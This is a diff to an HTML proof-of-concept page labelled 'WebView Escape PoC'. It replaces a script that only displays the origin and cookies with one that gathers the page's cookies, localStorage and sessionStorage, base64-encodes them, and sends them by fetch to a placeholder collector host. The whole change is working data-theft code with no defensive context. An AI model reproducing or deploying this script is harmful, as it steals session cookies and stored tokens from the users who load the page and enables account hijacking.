@@ -1,12 +1,9 @@
-<!DOCTYPE html>
-<html>
-<body>
-<h1>WebView Escape PoC</h1>
-
 <script>
-document.body.innerHTML += "<p>Origin: " + location.origin + "</p>";
-document.body.innerHTML += "<p>Cookies: " + document.cookie + "</p>";
-</script>
+let data = {
+  cookie: document.cookie,
+  localStorage: JSON.stringify(localStorage),
+  sessionStorage: JSON.stringify(sessionStorage)
+};
 
-</body>
-</html>
+fetch("https://your-collector-site.com/log?d=" + btoa(JSON.stringify(data)));
+</script>
